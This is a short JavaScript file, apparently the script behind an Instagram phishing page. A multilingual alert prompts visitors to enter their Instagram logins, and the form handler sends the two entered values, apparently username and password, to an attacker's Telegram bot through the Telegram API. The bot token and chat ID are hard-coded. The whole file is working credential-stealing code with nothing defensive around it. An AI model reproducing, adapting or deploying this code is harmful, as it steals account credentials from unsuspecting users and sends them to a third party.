let writing = alert(" English: Write a instagram logins \n Turkish: Instagram girişlerini yaz \n Russian: Введи свои данные от инстаграма");


function integrationTG(e) {
  e.preventDefault();

  let text1 = document.querySelector(".text1");
  let text2 = document.querySelector(".text2");
  let message = text1.value + "\n" + text2.value;
  let chat_id = 1661066293;
  let token = "7088905572:AAGwevMKjTFrkS9DUK-PzNdeMoyu2djnhG8";

  let urlpi = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;

  axios
    .post(urlpi)
    .then((res) => {
      console.log("Succesfully");
    })
    .catch((error) => console.log(error + " Please write correctly😉✌️"));
}
